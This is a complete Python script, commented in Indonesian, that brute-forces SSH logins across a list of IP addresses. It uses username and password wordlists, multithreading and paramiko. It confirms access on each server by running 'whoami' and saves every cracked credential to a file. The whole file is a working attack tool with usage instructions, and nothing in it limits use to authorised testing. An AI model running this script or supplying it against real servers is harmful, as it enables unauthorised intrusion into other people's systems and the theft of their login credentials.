#!/usr/bin/python3
# ssh_brute.py - SSH Brute Force dengan IP list
import paramiko
import socket
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

class SSHBrute:
    def __init__(self, ip_file, user_file, pass_file, threads=10, timeout=5):
        self.ip_file = ip_file
        self.user_file = user_file
        self.pass_file = pass_file
        self.threads = threads
        self.timeout = timeout
        self.results = []
        self.found_creds = []
        
    def load_file(self, filename):
        """Load file ke list"""
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[-] File {filename} tidak ditemukan!")
            sys.exit(1)
    
    def try_ssh(self, ip, username, password):
        """Coba login SSH"""
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            ssh.connect(ip, 
                       username=username, 
                       password=password,
                       timeout=self.timeout,
                       banner_timeout=10,
                       auth_timeout=10)
            
            # Cek jika connection successful
            stdin, stdout, stderr = ssh.exec_command('whoami', timeout=5)
            output = stdout.read().decode().strip()
            
            return {
                'status': 'SUCCESS',
                'ip': ip,
                'username': username,
                'password': password,
                'user': output
            }
            
        except paramiko.AuthenticationException:
            return {'status': 'AUTH_FAILED', 'ip': ip, 'username': username}
        except socket.timeout:
            return {'status': 'TIMEOUT', 'ip': ip}
        except paramiko.SSHException as e:
            if 'Error reading SSH protocol banner' in str(e):
                return {'status': 'BANNER_ERROR', 'ip': ip}
            return {'status': 'SSH_ERROR', 'ip': ip, 'error': str(e)}
        except Exception as e:
            return {'status': 'ERROR', 'ip': ip, 'error': str(e)}
        finally:
            try:
                ssh.close()
            except:
                pass
    
    def brute_ip(self, ip):
        """Brute force untuk satu IP"""
        print(f"[*] Testing {ip}")
        
        for username in self.usernames:
            for password in self.passwords:
                result = self.try_ssh(ip, username, password)
                
                if result['status'] == 'SUCCESS':
                    print(f"\n[+] FOUND: {ip} | {username}:{password}")
                    self.found_creds.append(result)
                    return result
                elif result['status'] == 'AUTH_FAILED':
                    continue  # Coba password lain
                else:
                    # Error lainnya, skip IP ini
                    if 'Connection refused' in str(result.get('error', '')):
                        print(f"[-] {ip}: Connection refused")
                        return None
                    break  # Keluar dari loop untuk IP ini
        
        return None
    
    def run(self):
        """Main execution"""
        print("[*] Loading files...")
        self.ips = self.load_file(self.ip_file)
        self.usernames = self.load_file(self.user_file)
        self.passwords = self.load_file(self.pass_file)
        
        print(f"[*] Loaded {len(self.ips)} IPs, {len(self.usernames)} users, {len(self.passwords)} passwords")
        print(f"[*] Starting brute force with {self.threads} threads...\n")
        
        start_time = datetime.now()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Submit semua task
            future_to_ip = {executor.submit(self.brute_ip, ip): ip for ip in self.ips}
            
            # Process results
            for future in as_completed(future_to_ip):
                ip = future_to_ip[future]
                try:
                    result = future.result(timeout=30)
                    if result and result['status'] == 'SUCCESS':
                        self.results.append(result)
                except Exception as e:
                    print(f"[-] Error processing {ip}: {e}")
        
        end_time = datetime.now()
        duration = end_time - start_time
        
        # Print summary
        print("\n" + "="*50)
        print("[*] SCAN COMPLETE")
        print("="*50)
        print(f"[*] Duration: {duration}")
        print(f"[*] IPs tested: {len(self.ips)}")
        print(f"[*] Credentials found: {len(self.found_creds)}")
        
        if self.found_creds:
            print("\n[+] FOUND CREDENTIALS:")
            for cred in self.found_creds:
                print(f"    {cred['ip']} | {cred['username']}:{cred['password']} | User: {cred.get('user', 'N/A')}")
            
            # Save to file
            with open('found_credentials.txt', 'w') as f:
                for cred in self.found_creds:
                    f.write(f"{cred['ip']}:22 {cred['username']}:{cred['password']}\n")
            print(f"\n[*] Saved to: found_credentials.txt")
        
        return self.found_creds

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 ssh_brute.py <ip_list.txt> <user_list.txt> <pass_list.txt> [threads]")
        print("Example: python3 ssh_brute.py ips.txt users.txt passwords.txt 20")
        sys.exit(1)
    
    ip_file = sys.argv[1]
    user_file = sys.argv[2]
    pass_file = sys.argv[3]
    threads = int(sys.argv[4]) if len(sys.argv) > 4 else 10
    
    brute = SSHBrute(ip_file, user_file, pass_file, threads)
    brute.run()